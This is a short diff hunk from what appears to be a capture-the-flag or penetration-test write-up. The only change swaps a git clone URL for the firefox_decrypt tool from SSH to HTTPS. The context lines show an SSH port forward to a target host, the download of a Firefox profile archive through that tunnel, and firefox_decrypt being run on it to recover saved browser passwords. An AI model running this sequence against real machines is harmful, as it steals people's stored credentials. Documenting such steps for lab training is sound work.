@@ -195,7 +195,7 @@ ssh -N -L 8888:127.0.0.1:8888 elliot@192.168.5.30
 wget http://127.0.0.1:8888/esmhp32w.default-default.tar.gz -O esmhp32w.default-default.tar.gz
 tar -xf esmhp32w.default-default.tar.gz
 
-git clone git@github.com:unode/firefox_decrypt.git
+git clone https://github.com/unode/firefox_decrypt.git
 
 python firefox_decrypt.py esmhp32w.default-default/
 2024-05-30 20:53:53,778 - WARNING - profile.ini not found in esmhp32w.default-default/
